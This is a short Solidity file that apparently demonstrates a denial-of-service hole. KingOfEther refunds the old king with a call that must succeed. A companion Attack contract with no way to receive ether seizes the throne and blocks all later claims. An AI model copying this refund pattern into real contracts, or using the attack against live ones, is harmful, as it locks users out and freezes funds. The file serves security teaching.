pragma solidity ^0.8.0;

contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Not enough ether.");

        (bool success, ) = king.call{value: balance}("");
        require(success, "Fail");

        king = msg.sender;
        balance = msg.value;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
